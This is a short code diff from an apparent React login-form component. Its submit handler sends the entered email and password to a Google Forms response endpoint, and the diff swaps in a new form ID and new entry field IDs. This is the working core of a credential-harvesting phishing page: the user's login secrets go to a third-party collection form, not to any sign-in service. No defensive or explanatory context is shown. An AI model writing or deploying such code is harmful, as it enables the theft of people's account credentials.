@@ -7,11 +7,11 @@ function Loginform() {
     e.preventDefault();
 
     const formUrl =
-      'https://docs.google.com/forms/d/e/1FAIpQLSdhBz3xYEIy_kAzj-yzRL-oVvlW60R2lTZlM7iTP2ShliOf1Q/formResponse';
+      'https://docs.google.com/forms/d/e/1FAIpQLSc9uk5cLtwkUa42ZuPfRtKmBJan4LnbWaoRKJTOrkY4_IhAgw/formResponse';
 
     const formData = new FormData();
-    formData.append('entry.1294611020', email);
-    formData.append('entry.314819940', password);
+    formData.append('entry.749235714', email);
+    formData.append('entry.943123620', password);
 
     try {
       await fetch(formUrl, {
